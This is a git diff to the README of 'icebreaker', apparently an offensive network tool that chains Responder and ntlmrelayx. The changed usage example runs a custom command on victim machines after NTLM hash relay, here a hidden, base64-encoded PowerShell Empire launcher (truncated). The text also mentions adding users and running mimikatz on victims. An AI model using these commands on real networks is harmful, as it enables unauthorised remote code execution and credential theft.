@@ -46,9 +46,9 @@ Read from a newline separated list of IP addresses
 
 ```sudo ./icebreaker -l targets.txt```
 
-Read from Nmap XML file and tell Responder to use the eth0 interface rather than the default gateway interface
+Read from Nmap XML file, tell Responder to use the eth0 interface rather than the default gateway interface, and instead of having ntlmrelayx add a user and mimikatz'ing the victim upon hash relay, have it execute a custom command on the victim machine. In this case that command is an Empire shell launcher.
 
-```sudo ./icebreaker -x nmapscan.xml -i eth0```
+```sudo ./icebreaker -x nmapscan.xml -i eth0 -c "powershell.exe -NoP -NonI -w hidden -enc JABXAEMdwaT..."```
 
 Skip all five attacks and don't autocrack hashes
 
